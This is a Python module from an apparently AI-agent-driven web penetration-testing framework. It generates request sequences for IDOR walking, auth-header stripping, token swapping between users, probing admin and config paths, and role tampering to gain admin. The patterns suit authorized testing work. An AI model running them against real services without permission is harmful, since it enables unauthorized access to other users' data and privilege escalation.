"""Exploit tool implementations for ActionGraph execution.

Each exploit tool converts an AttackOpportunity into a sequence of CAMRO Steps.
These are called deterministically during the AttackPlan -> ActionGraph conversion.
The agent never calls these directly â€” it prescribes them in the attack plan output.
"""

from typing import List

from llmitm_v2.constants import StepPhase, StepType
from llmitm_v2.models.step import Step


def idor_walk_steps(exploit_target: str, observation: str) -> List[Step]:
    """Generate CAMRO steps for IDOR testing.

    Pattern: Login -> extract token -> request target with own ID -> request with other ID -> observe.
    """
    return [
        Step(
            order=0, phase=StepPhase.CAPTURE, type=StepType.HTTP_REQUEST,
            command="POST /rest/user/login",
            parameters={"method": "POST", "path": "/rest/user/login", "body": {"email": "{{EMAIL}}", "password": "{{PASSWORD}}"}},
            success_criteria="authentication",
        ),
        Step(
            order=0, phase=StepPhase.ANALYZE, type=StepType.REGEX_MATCH,
            command="extract token",
            parameters={"pattern": r'"token"\s*:\s*"([^"]+)"', "source": "{{previous_outputs[-1]}}"},
            success_criteria=".",
        ),
        Step(
            order=0, phase=StepPhase.CAPTURE, type=StepType.HTTP_REQUEST,
            command=f"GET {exploit_target}",
            parameters={
                "method": "GET", "path": exploit_target,
                "headers": {"Authorization": "Bearer {{previous_outputs[-1]}}"},
            },
            success_criteria=r'"id"',
        ),
        Step(
            order=0, phase=StepPhase.MUTATE, type=StepType.HTTP_REQUEST,
            command=f"GET {_increment_id(exploit_target)}",
            parameters={
                "method": "GET", "path": _increment_id(exploit_target),
                "headers": {"Authorization": "Bearer {{previous_outputs[-2]}}"},
            },
            success_criteria=r'"id"',
        ),
        Step(
            order=0, phase=StepPhase.OBSERVE, type=StepType.REGEX_MATCH,
            command="check IDOR",
            parameters={"pattern": r'"id"', "source": "{{previous_outputs[-1]}}"},
            success_criteria=r'"id"',
        ),
    ]


def auth_strip_steps(exploit_target: str, observation: str) -> List[Step]:
    """Generate CAMRO steps for auth stripping.

    Pattern: Login -> request target with auth -> request same target WITHOUT auth -> compare.
    """
    return [
        Step(
            order=0, phase=StepPhase.CAPTURE, type=StepType.HTTP_REQUEST,
            command="POST /rest/user/login",
            parameters={"method": "POST", "path": "/rest/user/login", "body": {"email": "{{EMAIL}}", "password": "{{PASSWORD}}"}},
            success_criteria="authentication",
        ),
        Step(
            order=0, phase=StepPhase.ANALYZE, type=StepType.REGEX_MATCH,
            command="extract token",
            parameters={"pattern": r'"token"\s*:\s*"([^"]+)"', "source": "{{previous_outputs[-1]}}"},
            success_criteria=".",
        ),
        Step(
            order=0, phase=StepPhase.CAPTURE, type=StepType.HTTP_REQUEST,
            command=f"GET {exploit_target} (auth'd)",
            parameters={
                "method": "GET", "path": exploit_target,
                "headers": {"Authorization": "Bearer {{previous_outputs[-1]}}"},
            },
            success_criteria=".",
        ),
        Step(
            order=0, phase=StepPhase.REPLAY, type=StepType.HTTP_REQUEST,
            command=f"GET {exploit_target} (no auth)",
            parameters={"method": "GET", "path": exploit_target},
            success_criteria=".",
        ),
        Step(
            order=0, phase=StepPhase.OBSERVE, type=StepType.REGEX_MATCH,
            command="check auth strip",
            parameters={"pattern": r'"id"|"email"|"data"', "source": "{{previous_outputs[-1]}}"},
            success_criteria=r'"id"|"email"|"data"',
        ),
    ]


def token_swap_steps(exploit_target: str, observation: str) -> List[Step]:
    """Generate CAMRO steps for token swapping.

    Pattern: Login as User A -> Login as User B -> request User A's resource with User B's token -> observe.
    """
    return [
        Step(
            order=0, phase=StepPhase.CAPTURE, type=StepType.HTTP_REQUEST,
            command="POST /rest/user/login (User A)",
            parameters={"method": "POST", "path": "/rest/user/login", "body": {"email": "{{EMAIL_A}}", "password": "{{PASSWORD_A}}"}},
            success_criteria="authentication",
        ),
        Step(
            order=0, phase=StepPhase.ANALYZE, type=StepType.REGEX_MATCH,
            command="extract token A",
            parameters={"pattern": r'"token"\s*:\s*"([^"]+)"', "source": "{{previous_outputs[-1]}}"},
            success_criteria=".",
        ),
        Step(
            order=0, phase=StepPhase.CAPTURE, type=StepType.HTTP_REQUEST,
            command="POST /rest/user/login (User B)",
            parameters={"method": "POST", "path": "/rest/user/login", "body": {"email": "{{EMAIL_B}}", "password": "{{PASSWORD_B}}"}},
            success_criteria="authentication",
        ),
        Step(
            order=0, phase=StepPhase.ANALYZE, type=StepType.REGEX_MATCH,
            command="extract token B",
            parameters={"pattern": r'"token"\s*:\s*"([^"]+)"', "source": "{{previous_outputs[-1]}}"},
            success_criteria=".",
        ),
        Step(
            order=0, phase=StepPhase.REPLAY, type=StepType.HTTP_REQUEST,
            command=f"GET {exploit_target} with User B's token",
            parameters={
                "method": "GET", "path": exploit_target,
                "headers": {"Authorization": "Bearer {{previous_outputs[-1]}}"},
            },
            success_criteria=r'"id"',
        ),
        Step(
            order=0, phase=StepPhase.OBSERVE, type=StepType.REGEX_MATCH,
            command="check token swap",
            parameters={"pattern": r'"id"', "source": "{{previous_outputs[-1]}}"},
            success_criteria=r'"id"',
        ),
    ]


def namespace_probe_steps(exploit_target: str, observation: str) -> List[Step]:
    """Generate CAMRO steps for namespace probing.

    Pattern: Hit known endpoint -> probe siblings in same path namespace -> observe responses.
    """
    base_path = "/".join(exploit_target.rstrip("/").split("/")[:-1])
    siblings = ["config", "admin", "settings", "users", "debug", "internal"]
    steps: List[Step] = [
        Step(
            order=0, phase=StepPhase.CAPTURE, type=StepType.HTTP_REQUEST,
            command=f"GET {exploit_target} (baseline)",
            parameters={"method": "GET", "path": exploit_target},
            success_criteria=".",
        ),
    ]
    for sib in siblings:
        steps.append(Step(
            order=0, phase=StepPhase.REPLAY, type=StepType.HTTP_REQUEST,
            command=f"GET {base_path}/{sib}",
            parameters={"method": "GET", "path": f"{base_path}/{sib}"},
        ))
    steps.append(Step(
        order=0, phase=StepPhase.OBSERVE, type=StepType.REGEX_MATCH,
        command="check namespace probes",
        parameters={"pattern": r'"id"|"email"|"data"|"config"|"admin"', "source": "{{previous_outputs[-1]}}"},
        success_criteria=r'"id"|"email"|"data"|"config"|"admin"',
    ))
    return steps


def role_tamper_steps(exploit_target: str, observation: str) -> List[Step]:
    """Generate CAMRO steps for role tampering.

    Pattern: Login -> extract token -> modify role/privilege field in request body -> replay -> observe.
    """
    return [
        Step(
            order=0, phase=StepPhase.CAPTURE, type=StepType.HTTP_REQUEST,
            command="POST /rest/user/login",
            parameters={"method": "POST", "path": "/rest/user/login", "body": {"email": "{{EMAIL}}", "password": "{{PASSWORD}}"}},
            success_criteria="authentication",
        ),
        Step(
            order=0, phase=StepPhase.ANALYZE, type=StepType.REGEX_MATCH,
            command="extract token",
            parameters={"pattern": r'"token"\s*:\s*"([^"]+)"', "source": "{{previous_outputs[-1]}}"},
            success_criteria=".",
        ),
        Step(
            order=0, phase=StepPhase.MUTATE, type=StepType.HTTP_REQUEST,
            command=f"POST {exploit_target} with role=admin",
            parameters={
                "method": "POST", "path": exploit_target,
                "headers": {"Authorization": "Bearer {{previous_outputs[-1]}}"},
                "body": {"role": "admin"},
            },
            success_criteria=".",
        ),
        Step(
            order=0, phase=StepPhase.OBSERVE, type=StepType.REGEX_MATCH,
            command="check role tamper",
            parameters={"pattern": r'"role"\s*:\s*"admin"', "source": "{{previous_outputs[-1]}}"},
            success_criteria=r'"role"\s*:\s*"admin"',
        ),
    ]


def _increment_id(path: str) -> str:
    """Increment the last numeric segment in a URL path for IDOR testing."""
    import re
    match = re.search(r'/(\d+)(?=[/?#]|$)', path)
    if match:
        old_id = match.group(1)
        new_id = str(int(old_id) + 1)
        return path[:match.start(1)] + new_id + path[match.end(1):]
    return path + "/2"


# Registry mapping exploit tool name -> step generator
EXPLOIT_STEP_GENERATORS = {
    "idor_walk": idor_walk_steps,
    "auth_strip": auth_strip_steps,
    "token_swap": token_swap_steps,
    "namespace_probe": namespace_probe_steps,
    "role_tamper": role_tamper_steps,
}
